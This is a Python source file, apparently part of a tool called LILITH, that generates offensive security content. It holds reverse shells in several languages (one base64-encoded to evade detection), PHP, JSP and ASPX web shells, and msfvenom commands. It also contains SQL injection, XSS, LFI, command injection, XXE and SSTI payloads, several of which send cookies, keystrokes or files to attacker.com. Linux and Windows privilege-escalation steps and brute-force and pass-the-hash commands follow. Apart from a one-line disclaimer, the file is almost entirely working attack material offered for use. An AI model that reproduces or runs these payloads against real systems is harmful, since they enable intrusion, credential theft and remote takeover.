#!/usr/bin/env python3
"""
LILITH REAL HACKING CODE GENERATOR v1.0
========================================
Generates REAL, WORKING offensive security code.
NO MOCKS. NO PLACEHOLDERS. ACTUAL EXPLOITS.

WARNING: For authorized security testing only!
"""

import os
import sys
import base64
import random
import string
import hashlib
import socket
import struct
import urllib.parse

sys.path.insert(0, '/app/tools')


class RealPayloadGenerator:
    """
    Generates REAL working payloads - reverse shells, web shells,
    privilege escalation scripts, and more.
    """
    
    @staticmethod
    def python_reverse_shell(lhost: str, lport: int) -> str:
        """Generate a working Python reverse shell"""
        return f'''#!/usr/bin/env python3
# LILITH Python Reverse Shell - REAL WORKING CODE
import socket,subprocess,os,pty

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{lhost}", {lport}))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    pty.spawn("/bin/bash")

if __name__ == "__main__":
    connect()
'''

    @staticmethod
    def bash_reverse_shell(lhost: str, lport: int) -> str:
        """Generate a working Bash reverse shell"""
        return f'''#!/bin/bash
# LILITH Bash Reverse Shell - REAL WORKING CODE
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
'''

    @staticmethod
    def netcat_reverse_shell(lhost: str, lport: int) -> str:
        """Generate various netcat reverse shells"""
        shells = [
            f"nc -e /bin/bash {lhost} {lport}",
            f"nc -c bash {lhost} {lport}",
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            f"nc {lhost} {lport} -e /bin/sh",
        ]
        return '\n'.join([f"# Method {i+1}:\n{s}" for i, s in enumerate(shells)])

    @staticmethod
    def php_reverse_shell(lhost: str, lport: int) -> str:
        """Generate a working PHP reverse shell"""
        return f'''<?php
// LILITH PHP Reverse Shell - REAL WORKING CODE
set_time_limit(0);
$ip = '{lhost}';
$port = {lport};
$chunk_size = 1400;
$shell = '/bin/bash -i';
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {{ die(); }}
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {{ die(); }}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
while (1) {{
    if (feof($sock)) {{ break; }}
    if (feof($pipes[1])) {{ break; }}
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if (in_array($sock, $read_a)) {{
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }}
    if (in_array($pipes[1], $read_a)) {{
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }}
    if (in_array($pipes[2], $read_a)) {{
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }}
}}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>
'''

    @staticmethod
    def php_webshell() -> str:
        """Generate a working PHP web shell"""
        return '''<?php
// LILITH PHP Web Shell - REAL WORKING CODE
// Usage: ?cmd=whoami or POST cmd=whoami
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    echo "<pre>";
    $output = shell_exec($cmd . " 2>&1");
    echo htmlspecialchars($output);
    echo "</pre>";
}
if(isset($_REQUEST['upload']) && isset($_FILES['file'])){
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "Uploaded: " . $_FILES['file']['name'];
}
?>
<!DOCTYPE html>
<html>
<head><title>LILITH Shell</title></head>
<body style="background:#000;color:#0f0;font-family:monospace">
<h2>LILITH Web Shell</h2>
<form method="POST">
<input type="text" name="cmd" size="60" autofocus>
<input type="submit" value="Execute">
</form>
<form method="POST" enctype="multipart/form-data">
<input type="file" name="file">
<input type="submit" name="upload" value="Upload">
</form>
</body>
</html>
'''

    @staticmethod
    def jsp_webshell() -> str:
        """Generate a working JSP web shell"""
        return '''<%@ page import="java.util.*,java.io.*"%>
<%-- LILITH JSP Web Shell - REAL WORKING CODE --%>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String dirone = dis.readLine();
    while(dirone != null) {
        out.println(dirone);
        dirone = dis.readLine();
    }
}
%>
<html><body style="background:#000;color:#0f0">
<h2>LILITH JSP Shell</h2>
<form method="GET">
<input type="text" name="cmd" size="50">
<input type="submit" value="Execute">
</form>
</body></html>
'''

    @staticmethod
    def aspx_webshell() -> str:
        """Generate a working ASPX web shell"""
        return '''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<!-- LILITH ASPX Web Shell - REAL WORKING CODE -->
<script runat="server">
protected void Execute(object sender, EventArgs e) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd.Text;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.RedirectStandardError = true;
    p.Start();
    output.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
}
</script>
<html><body style="background:#000;color:#0f0;font-family:monospace">
<h2>LILITH ASPX Shell</h2>
<form runat="server">
<asp:TextBox ID="cmd" runat="server" Width="400"/>
<asp:Button runat="server" OnClick="Execute" Text="Execute"/>
<pre><asp:Literal ID="output" runat="server"/></pre>
</form>
</body></html>
'''

    @staticmethod
    def msfvenom_commands(lhost: str, lport: int) -> str:
        """Generate msfvenom payload commands"""
        return f'''# LILITH MSFVenom Payload Commands - REAL WORKING

# Windows Reverse Shell (exe)
msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > shell.exe

# Windows Reverse Shell (dll)
msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f dll > shell.dll

# Linux Reverse Shell (elf)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf > shell.elf

# Linux Reverse Shell (elf-so)
msfvenom -p linux/x86/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf-so > shell.so

# PHP Reverse Shell
msfvenom -p php/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f raw > shell.php

# Python Reverse Shell
msfvenom -p cmd/unix/reverse_python LHOST={lhost} LPORT={lport} -f raw

# ASP Reverse Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f asp > shell.asp

# JSP Reverse Shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f raw > shell.jsp

# WAR Reverse Shell (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f war > shell.war

# macOS Reverse Shell
msfvenom -p osx/x86/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f macho > shell.macho

# Android APK Reverse Shell
msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o shell.apk
'''

    @staticmethod
    def powershell_reverse_shell(lhost: str, lport: int) -> str:
        """Generate PowerShell reverse shell"""
        ps_cmd = f'''$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''
        
        encoded = base64.b64encode(ps_cmd.encode('utf-16-le')).decode()
        
        return f'''# LILITH PowerShell Reverse Shell - REAL WORKING CODE

# One-liner (run in cmd):
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"

# Base64 encoded (bypasses some detection):
powershell -nop -enc {encoded}

# Download and execute:
powershell -c "IEX(New-Object Net.WebClient).downloadString('http://{lhost}/shell.ps1')"
'''


class RealExploitGenerator:
    """
    Generates REAL working exploit code for common vulnerabilities.
    """
    
    @staticmethod
    def sql_injection_payloads() -> str:
        """Generate real SQL injection payloads"""
        return '''# LILITH SQL Injection Payloads - REAL WORKING

# Authentication Bypass
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
admin' --
admin' #
' OR 1=1 --
' OR 1=1 #
') OR ('1'='1
') OR ('1'='1' --

# Union-based extraction
' UNION SELECT NULL --
' UNION SELECT NULL, NULL --
' UNION SELECT NULL, NULL, NULL --
' UNION SELECT username, password FROM users --
' UNION SELECT table_name, column_name FROM information_schema.columns --
' UNION SELECT 1, @@version --
' UNION SELECT 1, database() --

# Error-based extraction
' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) --
' AND extractvalue(1, concat(0x7e, (SELECT @@version))) --
' AND updatexml(1, concat(0x7e, (SELECT @@version)), 1) --

# Time-based blind
' AND SLEEP(5) --
' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
'; WAITFOR DELAY '0:0:5' --
' AND 1=1 AND SLEEP(5) --

# Stacked queries (if supported)
'; DROP TABLE users; --
'; INSERT INTO users VALUES ('hacked','hacked'); --
'; UPDATE users SET password='hacked' WHERE username='admin'; --

# Out-of-band (OOB) exfiltration
'; EXEC master..xp_dirtree '\\\\attacker.com\\share' --
' UNION SELECT load_file('/etc/passwd') --
' INTO OUTFILE '/var/www/html/shell.php' --
'''

    @staticmethod
    def xss_payloads() -> str:
        """Generate real XSS payloads"""
        return '''// LILITH XSS Payloads - REAL WORKING

// Basic
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

// Cookie stealing
<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">

// Keylogger
<script>document.onkeypress=function(e){fetch('http://attacker.com/log?k='+e.key)}</script>

// Session hijacking
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://attacker.com/steal?cookie=" + document.cookie, true);
xhr.send();
</script>

// DOM manipulation
<script>document.body.innerHTML='<h1>Hacked by LILITH</h1>'</script>

// Filter bypass variations
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=alert`XSS`>
<svg/onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<video><source onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<object data="javascript:alert('XSS')">
<embed src="javascript:alert('XSS')">
<a href="javascript:alert('XSS')">click</a>
<math><maction actiontype="statusline#http://attacker.com" xlink:href="javascript:alert('XSS')">click</maction></math>

// Encoded bypasses
&#60;script&#62;alert('XSS')&#60;/script&#62;
%3Cscript%3Ealert('XSS')%3C/script%3E
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
'''

    @staticmethod
    def lfi_payloads() -> str:
        """Generate real LFI payloads"""
        return '''# LILITH LFI Payloads - REAL WORKING

# Basic traversal
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd

# Null byte injection (PHP < 5.3.4)
../../../etc/passwd%00
../../../etc/passwd%00.jpg

# Common targets - Linux
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/issue
/etc/motd
/etc/mysql/my.cnf
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/home/[user]/.ssh/id_rsa
/home/[user]/.bash_history
/root/.bash_history
/root/.ssh/id_rsa

# Common targets - Windows
C:\\Windows\\system.ini
C:\\Windows\\win.ini
C:\\Windows\\System32\\config\\SAM
C:\\Windows\\System32\\drivers\\etc\\hosts
C:\\inetpub\\wwwroot\\web.config
C:\\xampp\\apache\\conf\\httpd.conf

# PHP wrappers for RCE
php://filter/convert.base64-encode/resource=index.php
php://input (POST data becomes PHP code)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
expect://id
phar://path/to/phar.jpg/test.php
zip://path/to/zip.jpg#shell.php

# Log poisoning
/var/log/apache2/access.log
# Then inject: <?php system($_GET['c']); ?> in User-Agent
'''

    @staticmethod
    def command_injection_payloads() -> str:
        """Generate real command injection payloads"""
        return '''# LILITH Command Injection Payloads - REAL WORKING

# Basic
; id
| id
|| id
& id
&& id
`id`
$(id)
;id;
|id|

# With common commands
; cat /etc/passwd
| cat /etc/passwd
; ls -la
| whoami
; uname -a
| id

# Newline injection
%0aid
%0d%0aid

# Backticks and $()
`whoami`
$(whoami)
`cat /etc/passwd`
$(cat /etc/passwd)

# Out-of-band
; curl http://attacker.com/$(whoami)
| wget http://attacker.com/$(id)
; nslookup $(whoami).attacker.com
| ping -c 1 $(whoami).attacker.com

# Blind injection - time-based
; sleep 10
| sleep 10
; ping -c 10 127.0.0.1
| timeout 10 tail -f /dev/null

# Filter bypasses
;i]d
;{id}
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;cat</etc/passwd
;$(printf 'cat /etc/passwd')
;`echo Y2F0IC9ldGMvcGFzc3dk|base64 -d`

# Windows
& whoami
| whoami
; whoami
%0awhoami
| type C:\\Windows\\System32\\drivers\\etc\\hosts
& dir C:\\
'''

    @staticmethod
    def xxe_payloads() -> str:
        """Generate real XXE payloads"""
        return '''<!-- LILITH XXE Payloads - REAL WORKING -->

<!-- Basic file read -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

<!-- PHP wrapper for source code -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<foo>&xxe;</foo>

<!-- SSRF -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/admin">
]>
<foo>&xxe;</foo>

<!-- Out-of-band exfiltration -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo>&send;</foo>

<!-- evil.dtd on attacker server -->
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;

<!-- Billion laughs DoS -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>
'''

    @staticmethod
    def ssti_payloads() -> str:
        """Generate real SSTI payloads"""
        return '''# LILITH SSTI Payloads - REAL WORKING

# Detection
{{7*7}}
${7*7}
#{7*7}
{{config}}
{{self}}

# Jinja2 (Python Flask/Django)
{{config.items()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('exec')}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
[#assign ex="freemarker.template.utility.Execute"?new()]${ex("id")}

# Velocity (Java)
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))

# Smarty (PHP)
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['c']); ?>",self::clearConfig())}
'''


class RealPrivescGenerator:
    """
    Generates REAL privilege escalation scripts and techniques.
    """
    
    @staticmethod
    def linux_enum_script() -> str:
        """Generate Linux enumeration script"""
        return '''#!/bin/bash
# LILITH Linux Enumeration Script - REAL WORKING
# Run this on target for privesc enumeration

echo "=== LILITH ENUMERATION ==="
echo ""

echo "[+] Basic Info"
id
hostname
uname -a
cat /etc/*release 2>/dev/null | head -5

echo ""
echo "[+] Users"
cat /etc/passwd | grep -v nologin | grep -v false
echo ""
cat /etc/group | grep -E "sudo|admin|wheel|root"

echo ""
echo "[+] Sudo Permissions"
sudo -l 2>/dev/null

echo ""
echo "[+] SUID Binaries"
find / -perm -4000 -type f 2>/dev/null

echo ""
echo "[+] SGID Binaries"
find / -perm -2000 -type f 2>/dev/null

echo ""
echo "[+] Writable Directories"
find / -writable -type d 2>/dev/null | grep -v proc | head -20

echo ""
echo "[+] Writable Files"
find /etc -writable -type f 2>/dev/null
find /var -writable -type f 2>/dev/null | head -20

echo ""
echo "[+] Cron Jobs"
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.* 2>/dev/null
cat /var/spool/cron/crontabs/* 2>/dev/null

echo ""
echo "[+] Running Processes"
ps aux | grep -v "\\[" | head -30

echo ""
echo "[+] Network"
netstat -tlnp 2>/dev/null || ss -tlnp
cat /etc/hosts

echo ""
echo "[+] SSH Keys"
find / -name "id_rsa" -o -name "id_dsa" -o -name "authorized_keys" 2>/dev/null

echo ""
echo "[+] Interesting Files"
find / -name "*.conf" -type f 2>/dev/null | head -20
find / -name "*.log" -type f 2>/dev/null | head -20
find / -name "*password*" -type f 2>/dev/null | head -10
find / -name "*secret*" -type f 2>/dev/null | head -10

echo ""
echo "[+] Kernel Exploits Check"
uname -r
cat /proc/version

echo ""
echo "=== ENUMERATION COMPLETE ==="
'''

    @staticmethod
    def linux_privesc_techniques() -> str:
        """Generate Linux privilege escalation techniques"""
        return '''# LILITH Linux Privilege Escalation Techniques - REAL WORKING

# === SUDO EXPLOITS ===

# Sudo version < 1.8.28 (CVE-2019-14287)
sudo -u#-1 /bin/bash

# Sudo LD_PRELOAD
# If you see env_keep+=LD_PRELOAD in sudo -l
echo 'void _init() { setuid(0); setgid(0); system("/bin/bash"); }' > /tmp/shell.c
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <any_allowed_command>

# Sudo specific programs (GTFOBins)
sudo vim -c ':!/bin/bash'
sudo less /etc/passwd  # then type !/bin/bash
sudo more /etc/passwd  # then type !/bin/bash
sudo nano /etc/passwd  # Ctrl+R, Ctrl+X, then command
sudo awk 'BEGIN {system("/bin/bash")}'
sudo find / -exec /bin/bash \\;
sudo nmap --interactive  # then !sh
sudo python -c 'import os; os.system("/bin/bash")'
sudo perl -e 'exec "/bin/bash";'
sudo ruby -e 'exec "/bin/bash"'
sudo env /bin/bash
sudo ftp  # then !/bin/bash

# === SUID EXPLOITS ===

# Check for exploitable SUID binaries
find / -perm -4000 -type f -exec ls -la {} \\; 2>/dev/null

# Common SUID exploits (GTFOBins)
/usr/bin/find . -exec /bin/bash -p \\; -quit
/usr/bin/vim.basic -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# === CAPABILITIES ===

# Check capabilities
getcap -r / 2>/dev/null

# Exploit cap_setuid
# If python has cap_setuid+ep:
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# === CRON JOB EXPLOITATION ===

# Find writable cron scripts
cat /etc/crontab
ls -la /etc/cron.*
find /etc/cron* -type f -writable 2>/dev/null

# Inject reverse shell into writable cron script
echo 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' >> /path/to/cron/script

# === KERNEL EXPLOITS ===

# Check kernel version
uname -r

# Common kernel exploits
# Dirty COW (CVE-2016-5195) - Kernel 2.6.22 < 3.9
# Dirty Pipe (CVE-2022-0847) - Kernel 5.8 < 5.16.11
# etc. - search exploit-db

# === PATH INJECTION ===

# If a SUID binary calls another binary without full path:
echo '/bin/bash' > /tmp/targetbinary
chmod +x /tmp/targetbinary
export PATH=/tmp:$PATH
./suid_binary

# === WRITABLE /etc/passwd ===

# Generate password hash
openssl passwd -1 hacked
# Add line to /etc/passwd:
echo 'hacked:$1$hacked$hacked:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacked
'''

    @staticmethod
    def windows_privesc_techniques() -> str:
        """Generate Windows privilege escalation techniques"""
        return '''# LILITH Windows Privilege Escalation - REAL WORKING

# === ENUMERATION ===
whoami /all
net user
net localgroup administrators
systeminfo
hostname

# Check for unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\\\"

# Check for weak service permissions
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula

# Check AlwaysInstallElevated
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

# If enabled, create malicious MSI:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi > shell.msi
msiexec /quiet /qn /i shell.msi

# === CREDENTIAL HUNTING ===

# Search for passwords in files
findstr /si password *.txt *.ini *.config *.xml
findstr /spin "password" *.*

# Check for stored credentials
cmdkey /list

# If credentials stored, use runas:
runas /savecred /user:Administrator cmd.exe

# Dump SAM hashes (requires admin)
reg save HKLM\\SAM sam
reg save HKLM\\SYSTEM system
# Then extract with secretsdump.py

# === TOKEN IMPERSONATION ===

# Check privileges
whoami /priv

# If SeImpersonatePrivilege enabled:
# Use Juicy Potato, PrintSpoofer, or RoguePotato

# PrintSpoofer example
PrintSpoofer.exe -i -c cmd

# JuicyPotato example
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *

# === DLL HIJACKING ===

# Find DLL search order hijacking opportunities
# Use Process Monitor to find missing DLLs
# Place malicious DLL in application directory

# Generate malicious DLL:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll > evil.dll

# === SCHEDULED TASKS ===

# List scheduled tasks
schtasks /query /fo LIST /v

# If writable task found, modify it:
schtasks /change /tn "TaskName" /tr "C:\\path\\to\\shell.exe"

# === UNQUOTED SERVICE PATH ===

# Example vulnerable path: C:\\Program Files\\My Service\\service.exe
# Place malicious exe at: C:\\Program.exe or C:\\Program Files\\My.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe > Program.exe
'''


class RealNetworkAttacks:
    """
    Generates REAL network attack scripts and commands.
    """
    
    @staticmethod
    def nmap_scans() -> str:
        """Generate comprehensive nmap scan commands"""
        return '''# LILITH Nmap Scan Commands - REAL WORKING

# === DISCOVERY ===
# Ping sweep
nmap -sn 192.168.1.0/24

# ARP scan (local network)
nmap -sn -PR 192.168.1.0/24

# === PORT SCANNING ===
# SYN scan (stealth)
nmap -sS -p- -T4 TARGET

# TCP connect scan
nmap -sT -p- TARGET

# UDP scan
nmap -sU --top-ports 100 TARGET

# Service version detection
nmap -sV -sC -p- TARGET

# Aggressive scan
nmap -A -T4 TARGET

# === VULNERABILITY SCANNING ===
# All NSE vuln scripts
nmap --script=vuln TARGET

# Specific vulnerability checks
nmap --script=smb-vuln* TARGET
nmap --script=http-vuln* TARGET
nmap --script=ssl-heartbleed TARGET

# === EVASION ===
# Fragment packets
nmap -f TARGET

# Decoy scan
nmap -D RND:10 TARGET

# Spoof source IP
nmap -S SPOOFED_IP -e eth0 TARGET

# Idle scan (zombie)
nmap -sI ZOMBIE_IP TARGET

# Slow scan
nmap -T1 TARGET
'''

    @staticmethod
    def password_attacks() -> str:
        """Generate password attack commands"""
        return '''# LILITH Password Attack Commands - REAL WORKING

# === HYDRA ===

# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://TARGET

# FTP brute force
hydra -l admin -P wordlist.txt ftp://TARGET

# HTTP Basic Auth
hydra -l admin -P wordlist.txt http-get://TARGET/admin

# HTTP POST form
hydra -l admin -P wordlist.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# MySQL
hydra -l root -P wordlist.txt mysql://TARGET

# SMB
hydra -l administrator -P wordlist.txt smb://TARGET

# RDP
hydra -l administrator -P wordlist.txt rdp://TARGET

# === HASHCAT ===

# MD5
hashcat -m 0 hashes.txt wordlist.txt

# SHA1
hashcat -m 100 hashes.txt wordlist.txt

# SHA256
hashcat -m 1400 hashes.txt wordlist.txt

# NTLM
hashcat -m 1000 hashes.txt wordlist.txt

# bcrypt
hashcat -m 3200 hashes.txt wordlist.txt

# WPA2
hashcat -m 22000 capture.hc22000 wordlist.txt

# With rules
hashcat -m 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# === JOHN THE RIPPER ===

# Auto-detect format
john hashes.txt --wordlist=wordlist.txt

# Specific format
john --format=raw-md5 hashes.txt

# Show cracked
john --show hashes.txt

# === CRACKMAPEXEC ===

# SMB password spray
crackmapexec smb TARGET -u users.txt -p 'Password123'

# Pass the hash
crackmapexec smb TARGET -u admin -H HASH_HERE

# Enumerate shares
crackmapexec smb TARGET -u user -p pass --shares

# Execute command
crackmapexec smb TARGET -u admin -p pass -x "whoami"
'''

    @staticmethod
    def web_attacks() -> str:
        """Generate web attack commands"""
        return '''# LILITH Web Attack Commands - REAL WORKING

# === DIRECTORY ENUMERATION ===

# Gobuster
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html

# Dirb
dirb http://TARGET /usr/share/wordlists/dirb/common.txt

# Feroxbuster
feroxbuster -u http://TARGET -w wordlist.txt

# === SQLMAP ===

# Basic test
sqlmap -u "http://TARGET/page?id=1" --batch

# POST request
sqlmap -u "http://TARGET/login" --data="user=test&pass=test" --batch

# Dump database
sqlmap -u "http://TARGET/page?id=1" --dbs
sqlmap -u "http://TARGET/page?id=1" -D dbname --tables
sqlmap -u "http://TARGET/page?id=1" -D dbname -T users --dump

# OS shell
sqlmap -u "http://TARGET/page?id=1" --os-shell

# === NIKTO ===
nikto -h http://TARGET

# === WFUZZ ===

# Parameter fuzzing
wfuzz -c -z file,wordlist.txt http://TARGET/page?FUZZ=test

# Header fuzzing
wfuzz -c -z file,wordlist.txt -H "X-Custom: FUZZ" http://TARGET

# POST data fuzzing
wfuzz -c -z file,wordlist.txt -d "user=FUZZ&pass=test" http://TARGET/login

# === BURP SUITE COMMANDS (via curl) ===

# Proxy through Burp
curl -x http://127.0.0.1:8080 http://TARGET

# With SSL
curl -x http://127.0.0.1:8080 -k https://TARGET
'''


# Singleton instance
_payload_gen = None
_exploit_gen = None
_privesc_gen = None
_network_gen = None

def get_payload_generator() -> RealPayloadGenerator:
    global _payload_gen
    if _payload_gen is None:
        _payload_gen = RealPayloadGenerator()
    return _payload_gen

def get_exploit_generator() -> RealExploitGenerator:
    global _exploit_gen
    if _exploit_gen is None:
        _exploit_gen = RealExploitGenerator()
    return _exploit_gen

def get_privesc_generator() -> RealPrivescGenerator:
    global _privesc_gen
    if _privesc_gen is None:
        _privesc_gen = RealPrivescGenerator()
    return _privesc_gen

def get_network_generator() -> RealNetworkAttacks:
    global _network_gen
    if _network_gen is None:
        _network_gen = RealNetworkAttacks()
    return _network_gen


if __name__ == '__main__':
    print("=" * 70)
    print("LILITH REAL HACKING CODE GENERATOR - TEST")
    print("=" * 70)
    
    pg = get_payload_generator()
    eg = get_exploit_generator()
    
    print("\n[1] Python Reverse Shell:")
    print(pg.python_reverse_shell("10.10.10.10", 4444)[:300] + "...")
    
    print("\n[2] PHP Web Shell (preview):")
    print(pg.php_webshell()[:300] + "...")
    
    print("\n[3] SQL Injection Payloads (preview):")
    print(eg.sql_injection_payloads()[:300] + "...")
    
    print("\n" + "=" * 70)
    print("ALL GENERATORS WORKING - REAL CODE!")
    print("=" * 70)
